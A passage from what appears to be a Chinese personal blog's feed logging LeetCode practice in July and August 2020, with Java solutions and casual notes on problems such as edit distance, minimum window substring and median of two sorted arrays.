class="hljs-params">(String word1, String word2)</span> </span>&#123;        <span class="hljs-keyword">int</span> n1 = word1.length();        <span class="hljs-keyword">int</span> n2 = word2.length();        <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n1+<span class="hljs-number">1</span>][n2+<span class="hljs-number">1</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=n2;j++) dp[<span class="hljs-number">0</span>][j] = dp[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n1;i++) dp[i][<span class="hljs-number">0</span>] = dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]+<span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n1;i++) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=n2;j++) &#123;                <span class="hljs-keyword">if</span>(word1.charAt(i-<span class="hljs-number">1</span>) == word2.charAt(j-<span class="hljs-number">1</span>)) dp[i][j] = dp[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];                <span class="hljs-keyword">else</span> dp[i][j] = Math.min(Math.min(dp[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>],dp[i][j-<span class="hljs-number">1</span>]),dp[i-<span class="hljs-number">1</span>][j])+<span class="hljs-number">1</span>;            &#125;        &#125;        <span class="hljs-keyword">return</span> dp[n1][n2];    &#125;&#125;</code></pre></div><h3 id="颜色分类"><a href="#颜色分类" class="headerlink" title="颜色分类"></a><a href="https://leetcode-cn.com/problems/sort-colors/" target="_blank" rel="noopener">颜色分类</a></h3><p>用指针指向边界，然后遍历时交换位置</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sortColors</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> cur=<span class="hljs-number">0</span>,p0=<span class="hljs-number">0</span>,p2=nums.length-<span class="hljs-number">1</span>;        <span class="hljs-keyword">while</span>(cur&lt;=p2) &#123;            <span class="hljs-keyword">if</span>(nums[cur] == <span class="hljs-number">0</span>) &#123;                swap(nums,cur,p0);                cur++;                p0++;            &#125;            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(nums[cur] == <span class="hljs-number">2</span>) &#123;                swap(nums,cur,p2);                p2--;            &#125;            <span class="hljs-keyword">else</span> cur++;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j)</span> </span>&#123;        <span class="hljs-keyword">int</span> tmp = nums[i];        nums[i] = nums[j];        nums[j] = tmp;    &#125;&#125;</code></pre></div><h3 id="最小覆盖子串"><a href="#最小覆盖子串" class="headerlink" title="最小覆盖子串"></a><a href="https://leetcode-cn.com/problems/minimum-window-substring/" target="_blank" rel="noopener">最小覆盖子串</a></h3><p>滑动窗口，不会做，check也看不懂是在干嘛。。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    Map&lt;Character, Integer&gt; ori = <span class="hljs-keyword">new</span> HashMap&lt;Character, Integer&gt;();    Map&lt;Character, Integer&gt; cnt = <span class="hljs-keyword">new</span> HashMap&lt;Character, Integer&gt;();    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">minWindow</span><span class="hljs-params">(String s, String t)</span> </span>&#123;        <span class="hljs-keyword">int</span> tLen = t.length();        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; tLen; i++) &#123;            <span class="hljs-keyword">char</span> c = t.charAt(i);            ori.put(c, ori.getOrDefault(c, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);        &#125;        <span class="hljs-keyword">int</span> l = <span class="hljs-number">0</span>, r = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">int</span> len = Integer.MAX_VALUE, ansL = -<span class="hljs-number">1</span>, ansR = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">int</span> sLen = s.length();        <span class="hljs-keyword">while</span> (r &lt; sLen) &#123;            ++r;            <span class="hljs-keyword">if</span> (r &lt; sLen &amp;&amp; ori.containsKey(s.charAt(r))) &#123;                cnt.put(s.charAt(r), cnt.getOrDefault(s.charAt(r), <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);            &#125;            <span class="hljs-keyword">while</span> (check() &amp;&amp; l &lt;= r) &#123;                <span class="hljs-keyword">if</span> (r - l + <span class="hljs-number">1</span> &lt; len) &#123;                    len = r - l + <span class="hljs-number">1</span>;                    ansL = l;                    ansR = l + len;                &#125;                <span class="hljs-keyword">if</span> (ori.containsKey(s.charAt(l))) &#123;                    cnt.put(s.charAt(l), cnt.getOrDefault(s.charAt(l), <span class="hljs-number">0</span>) - <span class="hljs-number">1</span>);                &#125;                ++l;            &#125;        &#125;        <span class="hljs-keyword">return</span> ansL == -<span class="hljs-number">1</span> ? <span class="hljs-string">""</span> : s.substring(ansL, ansR);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">check</span><span class="hljs-params">()</span> </span>&#123;        Iterator iter = ori.entrySet().iterator();         <span class="hljs-keyword">while</span> (iter.hasNext()) &#123;             Map.Entry entry = (Map.Entry) iter.next();             Character key = (Character) entry.getKey();             Integer val = (Integer) entry.getValue();             <span class="hljs-keyword">if</span> (cnt.getOrDefault(key, <span class="hljs-number">0</span>) &lt; val) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;            &#125;        &#125;         <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;    &#125;&#125;</code></pre></div><h3 id="子集"><a href="#子集" class="headerlink" title="子集"></a><a href="https://leetcode-cn.com/problems/subsets/" target="_blank" rel="noopener">子集</a></h3><p>对输出的集合中每一个小序列添加新的数字后（这里复制用的是新空间），再放到输出集合中</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;  <span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; subsets(<span class="hljs-keyword">int</span>[] nums) &#123;    List&lt;List&lt;Integer&gt;&gt; output = <span class="hljs-keyword">new</span> ArrayList();    output.add(<span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;());    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> num : nums) &#123;      List&lt;List&lt;Integer&gt;&gt; newSubsets = <span class="hljs-keyword">new</span> ArrayList();      <span class="hljs-keyword">for</span> (List&lt;Integer&gt; curr : output) &#123;        newSubsets.add(<span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;(curr)&#123;&#123;add(num);&#125;&#125;);      &#125;      <span class="hljs-keyword">for</span> (List&lt;Integer&gt; curr : newSubsets) &#123;        output.add(curr);      &#125;    &#125;    <span class="hljs-keyword">return</span> output;  &#125;&#125;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;8月做题记录&quot;&gt;&lt;a href=&quot;#8月做题记录&quot; class=&quot;headerlink&quot; title=&quot;8月做题记录&quot;&gt;&lt;/a&gt;8月做题记录&lt;/h1&gt;&lt;p&gt;每几天就做一份md太麻烦了还得重新加标签，以后就一月一份了，反正搜也能搜到而且有目录&lt;/p&gt;
&lt;h3 id=</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="HOT100" scheme="http://yoursite.com/tags/HOT100/"/>
    
    <category term="每日一题" scheme="http://yoursite.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>7.23至7.31做题记录</title>
    <link href="http://yoursite.com/2020/07/23/7.23%E8%87%B37.31%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/07/23/7.23%E8%87%B37.31%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-07-23T06:42:30.000Z</published>
    <updated>2020-07-31T05:31:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="7-23至7-31做题记录"><a href="#7-23至7-31做题记录" class="headerlink" title="7.23至7.31做题记录"></a>7.23至7.31做题记录</h1><p>今天开始做HOT100的题目，之前的题目会用JS作为复习更新在JS力扣练习的文章里。</p><p>7.23每日一题是矩阵的最短路径，就不贴上来了。</p><h3 id="寻找两个正序数组的中位数"><a href="#寻找两个正序数组的中位数" class="headerlink" title="寻找两个正序数组的中位数"></a><a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/" target="_blank" rel="noopener">寻找两个正序数组的中位数</a></h3><p>时间复杂度要求O(log(m + n))，所以使用两个指针移动计数寻找总长度一半这样的不行，因为复杂度为O(m+n)，题解利用两个数组是排序的，用二分来寻找中位数K，在A的K/2位置与B的K/2位置比较，较小的那一个之前的所有元素一定不包含中位数，所以可以直接排除掉K/2个数，循环即可。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">findMedianSortedArrays</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums1, <span class="hljs-keyword">int</span>[] nums2)</span> </span>&#123;        <span class="hljs-keyword">int</span> length1 = nums1.length, length2 = nums2.length;        <span class="hljs-keyword">int</span> totalLength = length1 + length2;        <span class="hljs-keyword">if</span>(totalLength%<span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;            <span class="hljs-keyword">int</span> mid = totalLength/<span class="hljs-number">2</span>;            <span class="hljs-keyword">double</span> median = getKthElement(nums1,nums2,mid+<span class="hljs-number">1</span>);            <span class="hljs-keyword">return</span> median;        &#125;        <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">int</span> mid1=totalLength/<span class="hljs-number">2</span>-<span class="hljs-number">1</span>, mid2=totalLength/<span class="hljs-number">2</span>;            <span class="hljs-keyword">double</span> median = (getKthElement(nums1, nums2, mid1 + <span class="hljs-number">1</span>) + getKthElement(nums1, nums2, mid2 + <span class="hljs-number">1</span>)) / <span class="hljs-number">2.0</span>;            <span class="hljs-keyword">return</span> median;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getKthElement</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums1, <span class="hljs-keyword">int</span>[] nums2, <span class="hljs-keyword">int</span> k)</span> </span>&#123;        <span class="hljs-keyword">int</span> length1 = nums1.length, length2 = nums2.length;        <span class="hljs-keyword">int</span> index1=<span class="hljs-number">0</span>, index2=<span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> KthElement = <span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>) &#123;            <span class="hljs-keyword">if</span>(index1 == length1) <span class="hljs-keyword">return</span> nums2[index2+k-<span class="hljs-number">1</span>];            <span class="hljs-keyword">if</span>(index2 == length2) <span class="hljs-keyword">return</span> nums1[index1+k-<span class="hljs-number">1</span>];            <span class="hljs-keyword">if</span>(k == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> Math.min(nums1[index1],nums2[index2]);            <span class="hljs-keyword">int</span> half = k/<span class="hljs-number">2</span>;            <span class="hljs-keyword">int</span> newindex1 = Math.min(index1+half,length1)-<span class="hljs-number">1</span>;            <span class="hljs-keyword">int</span> newindex2 = Math.min(index2+half,length2)-<span class="hljs-number">1</span>;            <span class="hljs-keyword">int</span> pivot1 = nums1[newindex1], pivot2 = nums2[newindex2];            <span class="hljs-keyword">if</span>(pivot1 &lt;= pivot2) &#123;                k -= (newindex1-index1+<span class="hljs-number">1</span>);                index1 = newindex1+<span class="hljs-number">1</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;                k -= (newindex2-index2+<span class="hljs-number">1</span>);                index2 = newindex2+<span class="hljs-number">1</span>;            &#125;        &#125;    &#125;&#125;</code></pre></div><p>题解还给了一种O(min(m,n))的方法：<a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/solution/xun-zhao-liang-ge-you-xu-shu-zu-de-zhong-wei-s-114/" target="_blank" rel="noopener">力扣官方题解</a></p><h3 id="最长回文子串"><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/" target="_blank" rel="noopener">最长回文子串</a></h3><p>真尼玛这也能动态规划，中心扩散，还有一种时间复杂度更低的我没有看</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(String s)</span> </span>&#123;        <span class="hljs-keyword">int</span> len = s.length();        <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">2</span>) &#123;            <span class="hljs-keyword">return</span> s;        &#125;        <span class="hljs-keyword">int</span> maxLen = <span class="hljs-number">1</span>;        String res = s.substring(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>);        <span class="hljs-comment">// 中心位置枚举到 len - 2 即可</span>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;            String oddStr = centerSpread(s, i, i);            String evenStr = centerSpread(s, i, i + <span class="hljs-number">1</span>);            String maxLenStr = oddStr.length() &gt; evenStr.length() ? oddStr : evenStr;            <span class="hljs-keyword">if</span> (maxLenStr.length() &gt; maxLen) &#123;                maxLen = maxLenStr.length();                res = maxLenStr;            &#125;        &#125;        <span class="hljs-keyword">return</span> res;    &#125;    <span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">centerSpread</span><span class="hljs-params">(String s, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right)</span> </span>&#123;        <span class="hljs-comment">// left = right 的时候，此时回文中心是一个字符，回文串的长度是奇数</span>        <span class="hljs-comment">// right = left + 1 的时候，此时回文中心是一个空隙，回文串的长度是偶数</span>        <span class="hljs-keyword">int</span> len = s.length();        <span class="hljs-keyword">int</span> i = left;        <span class="hljs-keyword">int</span> j = right;        <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> &amp;&amp; j &lt; len) &#123;            <span class="hljs-keyword">if</span> (s.charAt(i) == s.charAt(j)) &#123;                i--;                j++;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">break</span>;            &#125;        &#125;        <span class="hljs-comment">// 这里要小心，跳出 while 循环时，恰好满足 s.charAt(i) != s.charAt(j)，因此不能取 i，不能取 j</span>        <span class="hljs-keyword">return</span> s.substring(i + <span class="hljs-number">1</span>, j);    &#125;&#125;</code></pre></div><h3 id="分割数组的最大值"><a href="#分割数组的最大值" class="headerlink" title="分割数组的最大值"></a><a href="https://leetcode-cn.com/problems/split-array-largest-sum/" target="_blank" rel="noopener">分割数组的最大值</a></h3><p>是真的牛批，看题解都差点没看懂，这他妈也是DP，时间复杂度更低的是贪心二分，因为那个值一定在数组总和与其中最大元素值之间，通过二分这个值来判断分出来的数组个数是否满足要求，这样更优</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">splitArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> m)</span> </span>&#123;        <span class="hljs-keyword">int</span> n = nums.length;        <span class="hljs-keyword">int</span>[][] f = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n+<span class="hljs-number">1</span>][m+<span class="hljs-number">1</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++) Arrays.fill(f[i],Integer.MAX_VALUE);        <span class="hljs-keyword">int</span>[] sub = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n+<span class="hljs-number">1</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) sub[i+<span class="hljs-number">1</span>] = sub[i]+nums[i];        f[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=Math.min(i,m);j++) &#123;                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k=<span class="hljs-number">0</span>;k&lt;i;k++) &#123;                    f[i][j] = Math.min(f[i][j],Math.max(sub[i]-sub[k],f[k][j-<span class="hljs-number">1</span>]));                &#125;            &#125;        &#125;        <span class="hljs-keyword">return</span> f[n][m];    &#125;&#125;</code></pre></div><h3 id="盛最多水的容器"><a href="#盛最多水的容器" class="headerlink" title="盛最多水的容器"></a><a href="https://leetcode-cn.com/problems/container-with-most-water/" target="_blank" rel="noopener">盛最多水的容器</a></h3><p>我以为还是DP，想复杂了，双指针O(n)就能解决</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] height)</span> </span>&#123;        <span class="hljs-keyword">int</span> res=<span class="hljs-number">0</span>, i=<span class="hljs-number">0</span>, j=height.length-<span class="hljs-number">1</span>;        <span class="hljs-keyword">while</span>(i &lt; j)            res = Math.max(res,height[i]&lt;height[j]?(j-i)*height[i++]:(j-i)*height[j--]);        <span class="hljs-keyword">return</span> res;    &#125;&#125;</code></pre></div><h3 id="判断子序列"><a href="#判断子序列" class="headerlink" title="判断子序列"></a><a href="https://leetcode-cn.com/problems/is-subsequence/" target="_blank" rel="noopener">判断子序列</a></h3><p>这个用双指针做的，但是如果要求很多个s求是否为子序列不太好，官解用了DP。。真的离谱，维护了一个DP数组查找每个位置下一个字符的位置在哪里，这样包装成函数会很好用</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isSubsequence</span><span class="hljs-params">(String s, String t)</span> </span>&#123;        <span class="hljs-keyword">if</span>(s.length()==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        <span class="hljs-keyword">if</span>(t.length()==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span>(j&lt;t.length()) &#123;            <span class="hljs-keyword">if</span>(t.charAt(j) == s.charAt(i)) i++;            <span class="hljs-keyword">if</span>(i == s.length()) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            j++;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;&#125;</code></pre></div><h3 id="矩阵中的最长递增路径"><a href="#矩阵中的最长递增路径" class="headerlink" title="矩阵中的最长递增路径"></a><a href="https://leetcode-cn.com/problems/longest-increasing-path-in-a-matrix/" target="_blank" rel="noopener">矩阵中的最长递增路径</a></h3><p>每次控制方向移动的步骤都有点懵，官解用DFS和拓扑排序做，后者其实就是动态规划的思想，但它统计用队列去搞了，就是队列实现拓扑的方法</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">// class Solution &#123;</span><span class="hljs-comment">//     public int longestIncreasingPath(int[][] matrix) &#123;</span><span class="hljs-comment">//         int n=matrix.length, m=matrix[0].length;</span><span class="hljs-comment">//         int[][] f = new int[n][m];</span><span class="hljs-comment">//         int res = Integer.MIN_VALUE;</span><span class="hljs-comment">//         // for(int i=1;i&lt;=n;i++) &#123;</span><span class="hljs-comment">//         //     for(int j=1;j&lt;=m;j++) &#123;</span><span class="hljs-comment">//         //         f[i][j]=1;</span><span class="hljs-comment">//         //     &#125;</span><span class="hljs-comment">//         // &#125;</span><span class="hljs-comment">//         for(int i=1;i&lt;=n;i++) &#123;</span><span class="hljs-comment">//             for(int j=1;j&lt;=m;j++) &#123;</span><span class="hljs-comment">//                 f[i][j] = </span><span class="hljs-comment">//             &#125;</span><span class="hljs-comment">//         &#125;</span><span class="hljs-comment">//     &#125;</span><span class="hljs-comment">//     public int cal(int i, int j, int[][] matrix, int[][] f) &#123;</span><span class="hljs-comment">//         int top=0, bottom=0,left=0,right=0;</span><span class="hljs-comment">//         if((j-1)&gt;=0) &#123;</span><span class="hljs-comment">//             left = matrix[i][j-1];</span><span class="hljs-comment">//             77</span><span class="hljs-comment">//         &#125;</span><span class="hljs-comment">//         if((j+1)&lt;matrix[0].length) right = matrix[i][j+1];</span><span class="hljs-comment">//         if((i-1)&gt;=0) top = matrix[i-1][j];</span><span class="hljs-comment">//         if((i+1)&lt;matrix.length) bottom = matrix[i+1][j];</span><span class="hljs-comment">//     &#125;</span><span class="hljs-comment">// &#125;这是自己写的DP没写完就去吃小龙虾了。。。回来懒得写直接copy官解</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[][] dirs = &#123;&#123;-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;&#125;;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> rows, columns;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">longestIncreasingPath</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] matrix)</span> </span>&#123;        <span class="hljs-keyword">if</span> (matrix == <span class="hljs-keyword">null</span> || matrix.length == <span class="hljs-number">0</span> || matrix[<span class="hljs-number">0</span>].length == <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        &#125;        rows = matrix.length;        columns = matrix[<span class="hljs-number">0</span>].length;        <span class="hljs-keyword">int</span>[][] memo = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[rows][columns];        <span class="hljs-keyword">int</span> ans = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; rows; ++i) &#123;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; columns; ++j) &#123;                ans = Math.max(ans, dfs(matrix, i, j, memo));            &#125;        &#125;        <span class="hljs-keyword">return</span> ans;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] matrix, <span class="hljs-keyword">int</span> row, <span class="hljs-keyword">int</span> column, <span class="hljs-keyword">int</span>[][] memo)</span> </span>&#123;        <span class="hljs-keyword">if</span> (memo[row][column] != <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">return</span> memo[row][column];        &#125;        ++memo[row][column];        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span>[] dir : dirs) &#123;            <span class="hljs-keyword">int</span> newRow = row + dir[<span class="hljs-number">0</span>], newColumn = column + dir[<span class="hljs-number">1</span>];            <span class="hljs-keyword">if</span> (newRow &gt;= <span class="hljs-number">0</span> &amp;&amp; newRow &lt; rows &amp;&amp; newColumn &gt;= <span class="hljs-number">0</span> &amp;&amp; newColumn &lt; columns &amp;&amp; matrix[newRow][newColumn] &gt; matrix[row][column]) &#123;                memo[row][column] = Math.max(memo[row][column], dfs(matrix, newRow, newColumn, memo) + <span class="hljs-number">1</span>);            &#125;        &#125;        <span class="hljs-keyword">return</span> memo[row][column];    &#125;&#125;</code></pre></div><h3 id="电话号码的字母组合"><a href="#电话号码的字母组合" class="headerlink" title="电话号码的字母组合"></a><a href="https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/" target="_blank" rel="noopener">电话号码的字母组合</a></h3><p>这题K神讲过，用递归深度遍历就行，就是输入每个键对应的字母有点麻烦</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    Map&lt;String, String&gt; phone = <span class="hljs-keyword">new</span> HashMap&lt;String, String&gt;() &#123;&#123;    put(<span class="hljs-string">"2"</span>, <span class="hljs-string">"abc"</span>);    put(<span class="hljs-string">"3"</span>, <span class="hljs-string">"def"</span>);    put(<span class="hljs-string">"4"</span>, <span class="hljs-string">"ghi"</span>);    put(<span class="hljs-string">"5"</span>, <span class="hljs-string">"jkl"</span>);    put(<span class="hljs-string">"6"</span>, <span class="hljs-string">"mno"</span>);    put(<span class="hljs-string">"7"</span>, <span class="hljs-string">"pqrs"</span>);    put(<span class="hljs-string">"8"</span>, <span class="hljs-string">"tuv"</span>);    put(<span class="hljs-string">"9"</span>, <span class="hljs-string">"wxyz"</span>);  &#125;&#125;;        List&lt;String&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;String&gt;();    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(String curres, String nextdigit)</span> </span>&#123;        <span class="hljs-keyword">if</span>(nextdigit.length() == <span class="hljs-number">0</span>) res.add(curres);        <span class="hljs-keyword">else</span> &#123;            String digit = nextdigit.substring(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);            String letter = phone.get(digit);            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;letter.length();i++) &#123;                String addletter = letter.substring(i,i+<span class="hljs-number">1</span>);                dfs(curres+addletter,nextdigit.substring(<span class="hljs-number">1</span>));            &#125;        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title">letterCombinations</span><span class="hljs-params">(String digits)</span> </span>&#123;        <span class="hljs-keyword">if</span>(digits.length() != <span class="hljs-number">0</span>) dfs(<span class="hljs-string">""</span>,digits);        <span class="hljs-keyword">return</span> res;     &#125;&#125;</code></pre></div><h3 id="合并两个有序链表"><a href="#合并两个有序链表" class="headerlink" title="合并两个有序链表"></a><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/" target="_blank" rel="noopener">合并两个有序链表</a></h3><p>自己写的迭代方法恶心的批爆，提交了官解的迭代，在这里码一下官解的递归，简洁明了</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> </span>&#123;        <span class="hljs-keyword">if</span> (l1 == <span class="hljs-keyword">null</span>) &#123;            <span class="hljs-keyword">return</span> l2;        &#125;        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (l2 == <span class="hljs-keyword">null</span>) &#123;            <span class="hljs-keyword">return</span> l1;        &#125;        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (l1.val &lt; l2.val) &#123;            l1.next = mergeTwoLists(l1.next, l2);            <span class="hljs-keyword">return</span> l1;        &#125;        <span class="hljs-keyword">else</span> &#123;            l2.next = mergeTwoLists(l1, l2.next);            <span class="hljs-keyword">return</span> l2;        &#125;    &#125;&#125;</code></pre></div><h3 id="寻宝"><a href="#寻宝" class="headerlink" title="寻宝"></a><a href="https://leetcode-cn.com/problems/xun-bao/" target="_blank" rel="noopener">寻宝</a></h3><p>这个每日一题太强了，我不会做，看官解看的很吃力。</p><h3 id="括号生成"><a href="#括号生成" class="headerlink" title="括号生成"></a><a href="https://leetcode-cn.com/problems/generate-parentheses/" target="_blank" rel="noopener">括号生成</a></h3><p>用递归回溯，没有考虑到其实只要当前添加位置右括号数量比左括号数量少就一定不会错误，而左括号在没有超过最大数目时可以任意添加</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title">generateParenthesis</span><span class="hljs-params">(<span 